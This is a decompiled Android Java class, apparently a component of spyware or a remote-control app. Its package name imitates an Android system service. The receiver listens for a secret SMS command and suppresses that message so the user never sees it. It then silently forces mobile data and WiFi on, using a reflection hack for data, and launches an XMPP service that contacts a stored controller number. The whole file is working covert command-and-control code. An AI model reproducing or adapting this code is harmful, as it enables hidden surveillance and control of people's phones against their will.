package com.android.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import com.xmpp.client.util.AppPreferences;
import com.xmpp.client.util.PresenceType;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import org.jivesoftware.smackx.packet.MessageEvent;

public class SMSReceive extends BroadcastReceiver {
    static final String TAG = "SMSReceive";
    static final String smsuri = "android.provider.Telephony.SMS_RECEIVED";
    private AppPreferences _appPrefs;
    private ConnectivityManager connManager = null;
    private Context mycontext = null;
    private String roleString = "";
    private String strSMSControl = "";
    private String strSelect_Mainnum = "";
    private WifiManager wiFiManager = null;

    private Boolean getXmppConnectStatus(String strCheckTarget) {
        if (new PresenceType(this.mycontext).GetPresenceType(strCheckTarget).booleanValue()) {
            return Boolean.valueOf(true);
        }
        Log.e(MessageEvent.OFFLINE, MessageEvent.OFFLINE);
        return Boolean.valueOf(false);
    }

    public void onReceive(Context context, Intent intent) {
        System.out.println("接收到訊息");
        Log.e("接收到訊息", "接收到訊息");
        this.mycontext = context;
        this.strSMSControl = context.getString(R.string.SMSControl);
        this._appPrefs = new AppPreferences(context);
        String strAction = intent.getAction();
        this.roleString = this._appPrefs.getBody();
        if (this.roleString.equalsIgnoreCase("b")) {
            Object[] myObj = (Object[]) intent.getExtras().get("pdus");
            SmsMessage[] smsMsg = new SmsMessage[myObj.length];
            System.out.println(myObj.length);
            String strPhone = "";
            String strPhone_check = "";
            String msg = "";
            for (int i = 0; i < myObj.length; i++) {
                smsMsg[i] = SmsMessage.createFromPdu((byte[]) myObj[i]);
                msg = smsMsg[i].getDisplayMessageBody();
                if (msg != null && msg.length() > 0 && msg.equalsIgnoreCase(this.strSMSControl)) {
                    abortBroadcast();
                    try {
                        this.connManager = (ConnectivityManager) context.getSystemService("connectivity");
                        NetworkInfo info = this.connManager.getActiveNetworkInfo();
                        if (info == null || !info.isConnected()) {
                            Log.d("mark", "没有可用网络");
                            toggleMobileData(context, true);
                            this.wiFiManager = (WifiManager) context.getSystemService("wifi");
                            if (!this.wiFiManager.isWifiEnabled()) {
                                this.wiFiManager.setWifiEnabled(true);
                            }
                        } else {
                            Log.d("mark", "当前网络名称：" + info.getTypeName());
                            this.strSelect_Mainnum = this._appPrefs.getMainnum();
                            if (!getXmppConnectStatus(this.strSelect_Mainnum).booleanValue()) {
                                Intent xmpp_service = new Intent(context, XmppService.class);
                                xmpp_service.setFlags(268435456);
                                context.startService(xmpp_service);
                            }
                        }
                    } catch (Exception e) {
                        Toast.makeText(context, e.toString(), 1).show();
                    }
                }
            }
        }
    }

    private void toggleMobileData(Context context, boolean enabled) {
        ConnectivityManager conMgr = (ConnectivityManager) context.getSystemService("connectivity");
        try {
            Field iConMgrField = Class.forName(conMgr.getClass().getName()).getDeclaredField("mService");
            iConMgrField.setAccessible(true);
            Object iConMgr = iConMgrField.get(conMgr);
            Method setMobileDataEnabledMethod = Class.forName(iConMgr.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", new Class[]{Boolean.TYPE});
            setMobileDataEnabledMethod.setAccessible(true);
            setMobileDataEnabledMethod.invoke(iConMgr, new Object[]{Boolean.valueOf(enabled)});
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e2) {
            e2.printStackTrace();
        } catch (SecurityException e3) {
            e3.printStackTrace();
        } catch (NoSuchMethodException e4) {
            e4.printStackTrace();
        } catch (IllegalArgumentException e5) {
            e5.printStackTrace();
        } catch (IllegalAccessException e6) {
            e6.printStackTrace();
        } catch (InvocationTargetException e7) {
            e7.printStackTrace();
        }
    }
}
